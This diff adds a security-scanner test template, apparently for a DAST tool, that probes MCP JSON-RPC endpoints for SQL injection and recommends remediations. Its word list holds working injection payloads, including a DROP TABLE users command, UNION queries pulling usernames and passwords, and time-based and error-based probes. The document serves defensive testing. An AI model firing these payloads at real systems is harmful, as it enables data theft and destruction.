@@ -1,0 +1,143 @@
+---
+id: MCP_SQL_INJECTION_PARAMETER_INJECTION
+
+info:
+  name: "MCP: SQL Injection Parameter Injection"
+  description: >
+    Tests whether MCP tool endpoints are vulnerable to SQL injection attacks through
+    parameter manipulation. This test attempts to inject malicious SQL payloads into
+    function parameters to bypass authentication, extract sensitive data, or manipulate
+    database operations.
+  details: >
+    Test idea:
+    - Inject SQL injection payloads into various parameter fields of MCP tool calls
+    - Test common SQL injection techniques including UNION-based, Boolean-based blind,
+      time-based blind, and error-based SQL injection
+    - Attempt to extract database schema, user credentials, and sensitive data
+    - Test for SQL injection in different parameter contexts (WHERE clauses, ORDER BY,
+      LIMIT, etc.)
+    - This template targets MCP endpoints that interact with databases and flags
+      successful SQL injection attempts through response analysis.
+  impact: >
+    Successful SQL injection through MCP parameters can lead to:
+    - Complete database compromise and data exfiltration
+    - Authentication bypass and privilege escalation
+    - Database schema disclosure and sensitive information exposure
+    - Data manipulation and deletion
+    - Server-side request forgery through database functions
+  remediation: |
+    To prevent SQL injection through MCP parameters:
+    
+    1. **Parameterized Queries**: Use parameterized queries and prepared statements for all database operations. Never concatenate user input directly into SQL queries.
+    
+    2. **Input Validation**: Implement strict input validation for all parameters. Validate parameter types, formats, and ranges before processing.
+    
+    3. **Input Sanitization**: Sanitize all parameter values to remove or escape SQL injection patterns and special characters.
+    
+    4. **Least Privilege Database Access**: Use database accounts with minimal required privileges. Avoid using administrative database accounts for application operations.
+    
+    5. **SQL Injection Detection**: Implement SQL injection detection mechanisms that can identify and block malicious SQL patterns.
+    
+    6. **Error Handling**: Implement secure error handling that doesn't reveal database schema or internal system details.
+    
+    7. **Input Encoding**: Properly encode all user input before using it in SQL queries to prevent injection attacks.
+    
+    8. **Database Security**: Implement database-level security controls including access controls, encryption, and monitoring.
+    
+    9. **Regular Security Testing**: Conduct regular security testing to identify and fix SQL injection vulnerabilities.
+    
+    10. **Logging and Monitoring**: Log all database access attempts and monitor for suspicious patterns.
+  category:
+    name: MCP_SECURITY
+    shortName: MCP_SEC
+    displayName: Model Context Protocol (MCP) Security
+  subCategory: MCP_SQL_INJECTION_PARAMETER_INJECTION
+  severity: CRITICAL
+  tags:
+    - mcp
+    - sql-injection
+    - parameter-injection
+    - database-security
+    - llm-security
+  references:
+    - https://owasp.org/www-project-top-ten/2017/A1_2017-Injection
+    - https://cwe.mitre.org/data/definitions/89.html
+    - https://owasp.org/www-project-llm-security-top-10/
+  cwe:
+    - CWE-89
+    - CWE-20
+    - CWE-74
+  cve:
+    - CVE-2023-41031
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+wordLists:
+  sqlInjectionPayloads:
+    - "'; DROP TABLE users; --"
+    - "1' OR '1'='1"
+    - "admin' --"
+    - "1' UNION SELECT username, password FROM users --"
+    - "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
+    - "1'; WAITFOR DELAY '00:00:05' --"
+    - "1' OR SLEEP(5) --"
+    - "1' AND (SELECT SUBSTRING(@@version,1,1)) = '5' --"
+    - "1' UNION SELECT table_name FROM information_schema.tables --"
+    - "1' AND (SELECT COUNT(*) FROM users) > 0 --"
+    - "1' OR 1=1 LIMIT 1 OFFSET 0 --"
+    - "1' ORDER BY 1 --"
+    - "1' GROUP BY 1 --"
+    - "1' HAVING 1=1 --"
+    - "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --"
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    eq: POST
+  request_payload:
+    contains_all:
+      - jsonrpc
+      - method
+      - params
+    for_one:
+      key:
+        regex: .*
+        extractMultiple: payloadKeys
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_body_param:
+            params.arguments.${payloadKeys}: "${sqlInjectionPayloads}"
+        - add_body_param:
+            params.arguments.query: "${sqlInjectionPayloads}"
+        - add_body_param:
+            params.arguments.filter: "${sqlInjectionPayloads}"
+        - add_body_param:
+            params.arguments.search: "${sqlInjectionPayloads}"
+        - add_body_param:
+            params.arguments.where: "${sqlInjectionPayloads}"
+validate:
+  response_payload:
+    contains_either: 
+      - "mysql"
+      - "postgresql"
+      - "sqlite"
+      - "oracle"
+      - "mssql"
+      - "database"
+      - "table"
+      - "column"
+      - "schema"
+      - "information_schema"
+      - "users"
+      - "admin"
+      - "password"
+      - "username"
+      - "version"
+      - "error"
+      - "syntax"
+      - "query"
+      - "sql"
